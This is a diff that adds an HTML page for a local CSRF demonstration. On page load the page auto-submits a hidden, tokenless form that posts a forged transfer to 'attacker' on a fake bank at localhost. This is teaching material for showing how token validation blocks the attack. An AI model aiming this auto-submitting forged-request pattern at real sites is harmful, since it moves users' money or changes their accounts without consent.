@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Local CSRF Demo - Automatic Trigger</title>
+  <style>
+    body { font: 16px/1.5 system-ui, sans-serif; max-width: 650px; margin: 60px auto; padding: 0 20px; color: #192638; }
+    .notice { padding: 16px; border: 1px solid #d6a854; background: #fff6e3; border-radius: 8px; }
+    small { color: #555; }
+  </style>
+</head>
+<body>
+  <h1>Demo: Unexpected transfer request</h1>
+  <p class="notice">Educational exercise: this local page automatically submits a forged transfer to the team's fake bank. Use only with your own local demo accounts.</p>
+  <p id="status" role="status">Preparing a demonstration request...</p>
+  <form id="forged-transfer" action="http://localhost:5000/transfer" method="POST" target="result-frame">
+    <input type="hidden" name="receiver" value="attacker">
+    <input type="hidden" name="amount" value="100">
+    <!-- Intentionally no csrf_token: the hardened bank should reject it. -->
+  </form>
+  <iframe name="result-frame" title="Background transfer response" hidden></iframe>
+  <small>Expected result: vulnerable mode changes Alice's fake balance; secure token-validation mode rejects the request. Check the bank dashboard separately.</small>
+  <script>
+    window.addEventListener("load", () => {
+      document.getElementById("forged-transfer").submit();
+      document.getElementById("status").textContent =
+        "Forged request submitted. Check the fake bank's balance; this page cannot read the bank response.";
+    });
+  </script>
+</body>
+</html>
